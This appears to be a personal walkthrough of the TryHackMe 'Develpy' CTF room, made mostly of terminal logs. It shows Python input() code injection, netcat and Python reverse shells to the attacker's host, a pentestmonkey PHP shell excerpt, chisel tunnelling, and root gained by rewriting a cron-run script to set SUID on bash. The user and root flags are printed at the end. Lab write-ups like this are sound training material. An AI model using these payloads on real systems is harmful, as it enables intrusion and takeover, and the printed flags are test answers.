----
boot2root machine for FIT and bsides Guatemala CTF
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png)

### Task 1  Develpy

 Start Machine

read user.txt and root.txt

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.144.39 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.144.39:22
Open 10.10.144.39:10000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 23:25 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:25
Completed NSE at 23:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:25
Completed NSE at 23:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:25
Completed NSE at 23:25, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:25
Completed Parallel DNS resolution of 1 host. at 23:25, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:25
Scanning 10.10.144.39 [2 ports]
Discovered open port 22/tcp on 10.10.144.39
Discovered open port 10000/tcp on 10.10.144.39
Completed Connect Scan at 23:25, 0.18s elapsed (2 total ports)
Initiating Service scan at 23:25
Scanning 2 services on 10.10.144.39
Completed Service scan at 23:27, 118.27s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.144.39.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:27
Completed NSE at 23:27, 10.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:27
Completed NSE at 23:27, 2.23s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:27
Completed NSE at 23:27, 0.00s elapsed
Nmap scan report for 10.10.144.39
Host is up, received user-set (0.18s latency).
Scanned at 2023-08-17 23:25:31 EDT for 132s

PORT      STATE SERVICE           REASON  VERSION
22/tcp    open  ssh               syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeAB1tAGCfeGkiBXodMGeCc6prI2xaWz/fNRhwusVEujBTQ1BdY3BqPHNf1JLGhqts1anfY9ydt0N1cdAEv3L16vH2cis+34jyek3d+TVp+oBLztNWY5Yfcv/3uRcy5yyZsKjMz+wyribpEFlbpvscrVYfI2Crtm5CgcaSwqDDtc1doeABJ9t3iSv+7MKBdWJ9N3xd/oTfI0fEOdIp8M568A1/CJEQINFPVu1txC/HTiY4jmVkNf6+JyJfFqshRMpFq2YmUi6GulwzWQONmbTyxqrZg2y+y2q1AuFeritRg9vvkBInW0x18FS8KLdy5ohoXgeoWsznpR1J/BzkNfap
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDGGFFv4aQm/+j6R2Vsg96zpBowtu0/pkUxksqjTqKhAFtHla6LE0BRJtSYgmm8+ItlKHjJX8DNYylnNDG+Ol/U=
|   256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbypBoQ33EbivAc05LqKzxLsJrTgXOrXG7qG/RoO30K
10000/tcp open  snet-sensor-mgmt? syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.94%I=7%D=8/17%Time=64DEE4B2%P=x86_64-pc-linux-gnu%r(N
SF:ULL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20")%
SF:r(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\
SF:r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?
SF:\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File
SF:\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20
SF:\x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x2
SF:0of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<strin
SF:g>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'\x2
SF:0is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20o
SF:f\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20ca
SF:ll\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20i
SF:n\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20
SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\
SF:)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nN
SF:ameError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPRequ
SF:est,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x
SF:20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20Tr
SF:aceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"\./
SF:exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20num_e
SF:xploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x20ex
SF:ploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\x20
SF:line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\x
SF:20not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x2
SF:0exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\x
SF:20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x2
SF:0<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20Plea
SF:se\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\
SF:n\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20
SF:\x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:27
Completed NSE at 23:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:27
Completed NSE at 23:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:27
Completed NSE at 23:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.94 seconds


┌──(witty㉿kali)-[~]
└─$ nc 10.10.144.39 10000

        Private 0days

 Please enther number of exploits to send??: 1

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.063 ms

┌──(witty㉿kali)-[~]
└─$ nc 10.10.144.39 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('id')
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

Exploit started, attacking target (tryhackme.com)...
                                                                                             
┌──(witty㉿kali)-[~]
└─$ nc 10.10.144.39 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('whoami')
king

Exploit started, attacking target (tryhackme.com)...

┌──(witty㉿kali)-[~]
└─$ nc 10.10.144.39 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('bash')      
bash: cannot set terminal process group (753): Inappropriate ioctl for device
bash: no job control in this shell
king@ubuntu:~$ whoami
king

or revshell

┌──(witty㉿kali)-[~]
└─$ nc 10.10.144.39 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('nc 10.8.19.103 1337 -e /bin/bash')

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.144.39] 50840
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
king@ubuntu:~$ ls -lah
ls -lah
total 324K
drwxr-xr-x 4 king king 4.0K Aug 27  2019 .
drwxr-xr-x 3 root root 4.0K Aug 25  2019 ..
-rw------- 1 root root 2.9K Aug 27  2019 .bash_history
-rw-r--r-- 1 king king  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king 3.7K Aug 25  2019 .bashrc
drwx------ 2 king king 4.0K Aug 25  2019 .cache
-rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king 4.0K Aug 25  2019 .nano
-rw-rw-r-- 1 king king    5 Aug 17 20:33 .pid
-rw-r--r-- 1 king king  655 Aug 25  2019 .profile
-rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king    0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 25  2019 .wget-hsts
king@ubuntu:~$ cat user.txt
cat user.txt
cf85ff769cfaaa721758949bf870b019

king@ubuntu:~$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.8.19.103 - - [17/Aug/2023 20:36:27] "GET /credentials.png HTTP/1.1" 200 -

┌──(witty㉿kali)-[~]
└─$ wget http://10.10.144.39:8000/credentials.png         
--2023-08-17 23:36:26--  http://10.10.144.39:8000/credentials.png
Connecting to 10.10.144.39:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 272113 (266K) [image/png]
Saving to: ‘credentials.png’

credentials.png   100%[=============>] 265.74K   349KB/s    in 0.8s    

2023-08-17 23:36:27 (349 KB/s) - ‘credentials.png’ saved [272113/272113]

king@ubuntu:~$ cat exploit.py
cat exploit.py
#!/usr/bin/python
import time, random
print ''
print '        Private 0days'
print ''
num_exploits = int(input(' Please enther number of exploits to send??: '))
print ''
print 'Exploit started, attacking target (tryhackme.com)...'
for i in range(num_exploits):
    time.sleep(1)
    print 'Exploiting tryhackme internal network: beacons_seq={} ttl=1337 time=0.0{} ms'.format(i+1, int(random.random() * 100))

king@ubuntu:~$ cat root.sh
cat root.sh
python /root/company/media/*.py
king@ubuntu:~$ cat run.sh
cat run.sh
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid

https://www.bertnase.de/npiet/npiet-execute.php

king@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh
#
king@ubuntu:~$ ls -lah
ls -lah
total 324K
drwxr-xr-x 4 king king 4.0K Aug 27  2019 .
drwxr-xr-x 3 root root 4.0K Aug 25  2019 ..
-rw------- 1 root root 2.9K Aug 27  2019 .bash_history
-rw-r--r-- 1 king king  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king 3.7K Aug 25  2019 .bashrc
drwx------ 2 king king 4.0K Aug 25  2019 .cache
-rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king 4.0K Aug 25  2019 .nano
-rw-rw-r-- 1 king king    4 Aug 18 06:55 .pid
-rw-r--r-- 1 king king  655 Aug 25  2019 .profile
-rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king    0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 25  2019 .wget-hsts

king@ubuntu:~$ mv root.sh root.sh.bak
mv root.sh root.sh.bak
king@ubuntu:~$ cat << EOF > root.sh
> chmod +s /bin/bash
> EOF
king@ubuntu:~$ cat root.sh
cat root.sh
chmod +s /bin/bash

king@ubuntu:~$ ls -lah /bin/bash
ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
king@ubuntu:~$ bash -p
bash -p
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
company  root.txt
bash-4.3# cat root.txt
cat root.txt
9c37646777a53910a347f387dce025ec

bash-4.3# cd company
cd company
bash-4.3# ls
ls
db.sqlite3  manage.py  mysite	  requirements.txt
LICENSE     media      README.md  run.sh
bash-4.3# cat manage.py
cat manage.py
#!/usr/bin/env python
import os
import sys

if __name__ == '__main__':
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mysite.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.121.191 - - [18/Aug/2023 09:59:54] "GET /chisel HTTP/1.1" 200 -

bash-4.3# wget 10.8.19.103/chisel
wget 10.8.19.103/chisel
--2023-08-18 06:59:55--  http://10.8.19.103/chisel
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8750072 (8.3M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]   8.34M  1.91MB/s    in 4.5s    

2023-08-18 07:00:00 (1.83 MB/s) - ‘chisel’ saved [8750072/8750072]

bash-4.3# netstat -tulpn
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      657/sshd        
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      769/python3     
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      764/socat       
tcp6       0      0 :::22                   :::*                    LISTEN      657/sshd        
udp        0      0 0.0.0.0:68              0.0.0.0:*                           487/dhclient    


bash-4.3# chmod +x chisel
chmod +x chisel
bash-4.3# ./chisel client 10.8.19.103:3000 R:8000:127.0.0.1:8080
./chisel client 10.8.19.103:3000 R:8000:127.0.0.1:8080
2023/08/18 07:03:11 client: Connecting to ws://10.8.19.103:3000
2023/08/18 07:03:13 client: Connected (Latency 197.291087ms)

┌──(witty㉿kali)-[~/Downloads]
└─$ chisel server --reverse -p 3000
2023/08/18 10:00:49 server: Reverse tunnelling enabled
2023/08/18 10:00:49 server: Fingerprint 8xTMDz+IrGq/js2bzTOEh7vziAaFFOX7hgvclgtgGLE=
2023/08/18 10:00:49 server: Listening on http://0.0.0.0:3000
2023/08/18 10:03:11 server: session#1: tun: proxy#R:8000=>8080: Listening

┌──(witty㉿kali)-[~/Downloads]
└─$ head payload_monkey.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.19.103';
$port = 4444;
$chunk_size = 1400;
$write_a = null;

┌──(witty㉿kali)-[~/Downloads]
└─$ nmap -sT -T4 -sC -sV -p8000 127.0.0.1
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 10:06 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0030s latency).

PORT     STATE SERVICE  VERSION
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.5.2
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 18 Aug 2023 14:06:44 GMT
|     Server: WSGIServer/0.2 CPython/3.5.2
|     Content-Type: text/html
|     Content-Length: 101
|     X-Frame-Options: SAMEORIGIN
|     <h1>Not Found</h1><p>The requested URL /nice ports,/Trinity.txt.bak was not found on this server.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 18 Aug 2023 14:06:38 GMT
|     Server: WSGIServer/0.2 CPython/3.5.2
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2097
|     X-Frame-Options: SAMEORIGIN
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <link rel="stylesheet" type="text/css" href="mysite/static/css/bootstrap.min.css">
|     <link rel="stylesheet" type="text/css" href="mysite/static/css/app.css">
|     <title>DevelPy - Programming Services</title>
|     </head>
|     <body>
|     <nav class="navbar navbar-expand-lg navbar-light mb-4" style="background-color:#decdc3">
|     <div class="container">
|     class="navbar-brand" href="/">DevelPy</a>
|     <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="fa
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: WSGIServer/0.2 CPython/3.5.2
|_http-title: DevelPy - Programming Services

nope I need a payload .py

┌──(witty㉿kali)-[~]
└─$ cat shell.py 
import pty;
RHOST=10.8.19.103
RPORT=4444
import sys
import socket
import os
import pty
s=socket.socket()
s.connect((RHOST,RPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")

I see /root/company/media/*.py

└─$ cat shell_2.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

but we already change root.sh

python /root/company/media/*.py

```

![[Pasted image 20230818090402.png]]

user.txt

*cf85ff769cfaaa721758949bf870b019*

root.txt

*9c37646777a53910a347f387dce025ec*

[[Intro to Threat Emulation]]